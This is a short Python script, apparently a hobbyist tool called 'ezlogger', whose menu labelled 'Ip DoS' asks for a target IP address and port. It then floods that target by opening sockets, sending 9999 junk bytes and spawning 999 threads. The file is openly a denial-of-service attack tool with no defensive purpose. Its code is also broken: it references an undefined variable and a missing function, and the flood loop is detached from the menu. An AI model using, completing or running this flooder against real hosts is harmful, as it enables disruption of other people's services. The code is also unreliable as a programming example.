import threading, colorama, os, time, socket, sys
from os import system
from colorama import Fore, init
from time import sleep

init()



banner = f'''
{Fore.RED}          _                             
{Fore.YELLOW}  ___ ___{Fore.RED}| | ___   __ _  __ _  ___ _ __ 
{Fore.YELLOW} / _ \_  /{Fore.RED} |/ _ \ / _` |/ _` |/ _ \ '__|
{Fore.YELLOW}|  __// /{Fore.RED}| | (_) | (_| | (_| |  __/ |   
{Fore.YELLOW} \___/___{Fore.RED}|{Fore.RED}_|\___/ \__, |\__, |\___|_|   
{Fore.RED}                  {Fore.RED}|___/ |___/ 
'''


def dosmenu():
    os.system("cls & title ezlogger - Ip DoS")
    print(banner)
    try:
        target = input(f'''
{Fore.RED}┌──[{Fore.LIGHTCYAN_EX}*{Fore.RED}]─[{Fore.LIGHTCYAN_EX}@ipadress~#{Fore.RED}]
{Fore.RED}└───{Fore.YELLOW}$ ''') 
        port = input(f'''
{Fore.RED}┌──[{Fore.LIGHTCYAN_EX}*{Fore.RED}]─[{Fore.LIGHTCYAN_EX}@port~#{Fore.RED}]
{Fore.RED}└───{Fore.YELLOW}$ ''')

    except:
        pass

while(1):
    s = socket.socket()
    s.connect((ip, port))
    s.send(b'a'*9999)
    s.close()
for x in range(999):
  threading.Thread(target=attack).start()